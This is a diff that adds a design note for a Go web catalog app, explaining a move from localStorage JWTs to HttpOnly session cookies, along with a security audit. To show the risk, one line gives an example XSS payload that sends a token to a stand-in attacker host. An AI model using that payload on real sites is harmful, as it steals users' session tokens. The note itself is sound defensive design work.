@@ -1,0 +1,75 @@
+=== v10 design: move browser JWT storage to HttpOnly cookies ===
+
+Background
+----------
+For the server-rendered browser experience, the `/web/login` form sets a
+server-managed `libratrack_session` cookie: HttpOnly, Secure on HTTPS,
+SameSite=Lax, host-only, Path=/, with Max-Age tied to the 24-hour token expiry.
+Browser web mutations validate this cookie. The REST API's `/api/v1/auth/login`
+keeps its Bearer-token JSON contract for non-browser clients; API routes accept
+Authorization: Bearer tokens only.
+
+Why localStorage is dangerous for server-rendered apps
+------------------------------------------------------
+1. localStorage is fully readable by any JavaScript on the page. A single XSS
+   payload exfiltrates it in one line:
+       fetch('//evil.example/?t=' + localStorage.getItem('jwt'))
+2. Server-rendered HTML still renders untrusted fields into page content and
+   attributes. Go's html/template contextual autoescaping helps prevent
+   injection in those contexts, but it cannot protect a token that page
+   JavaScript can read from storage once any script executes (for example,
+   after an XSS bug or a compromised script dependency).
+3. With HttpOnly, the token is invisible to document.cookie and to JS
+   entirely. XSS can still *use* the session (send requests as the victim)
+   but can no longer *steal* it. Blast radius drops from "permanent token
+   theft" to "same-origin request forgery" — the same threat class every
+   cookie-based site carries and mitigates with SameSite + CSRF tokens.
+4. localStorage never expires on its own; tokens linger until manually
+   cleared. Cookies honour Max-Age, so short-lived JWTs are enforced
+   client-side too.
+
+Cookie policy (v10)
+-------------------
+- HttpOnly : JS cannot read the token (XSS theft mitigated)
+- Secure   : HTTPS-only transport
+- SameSite : Lax — reduces cross-site sends; cookie-authenticated deletion also
+   and browser login check the request Origin against the request host and
+   scheme
+- Max-Age  : matches JWT expiry so the cookie dies with the token
+- Domain   : unset (host-only), Path=/
+
+Accepted trade-offs
+-------------------
+- Cookies are sent automatically, so CSRF remains relevant. SameSite and
+   Origin validation are both applied to the current cookie-authenticated
+   login and mutation routes. Add a synchronizer token if additional
+   cookie-authenticated mutation routes are introduced.
+- ~4KB per-cookie ceiling -> JWT claims kept minimal.
+- Third-party API clients that cannot use cookies keep the Bearer-header path
+  on endpoints that explicitly reject cookie auth.
+
+Implementation and manual audit (2026-10-17)
+--------------------------------------------
+- `internal/handler/auth_handler.go` sets the browser session cookie from
+   `/web/login` with HttpOnly, SameSite=Lax and a 24-hour Max-Age; Secure is
+   enabled for TLS requests. The browser response omits the JWT. The separate
+   REST login continues to return a Bearer token; REST auth remains Bearer-only.
+- All page and row templates are under `web/templates/` and
+   are parsed only with Go's `html/template`. No `text/template` usage exists.
+- No `template.HTML` conversions or trusted-HTML values are used. Titles,
+   author names, category names, and ISBN values are passed as ordinary typed
+   strings from database models. `TestCatalogAndHTMXIntegration` verifies that
+   an HTML-like book title is escaped in rendered output.
+- CSS, HTMX 2.0.4, templates, the `VARIANT` file, and SQL migration files are
+   embedded in the executable. Static files are served from an `fs.Sub` view;
+   the HTMX license is included alongside the vendored runtime. No CDN or
+   external font request is needed for the catalog.
+- `CGO_ENABLED=0 go build` produces the executable and the catalog/assets can
+   be served without adjacent web/templates/migrations folders. PostgreSQL and
+   runtime configuration (`DATABASE_URL`, `JWT_SECRET`) remain external
+   requirements. On macOS, Go executables still link Apple system libraries,
+   so `CGO_ENABLED=0` does not mean a freestanding Mach-O with no OS libraries.
+- Integration coverage exercises full catalog HTML, HTMX fragments, static
+   assets, autoescaping, cookie role enforcement, same-origin deletion, and
+   cross-origin rejection. A live browser smoke test still requires a running
+   PostgreSQL instance and configured runtime environment.
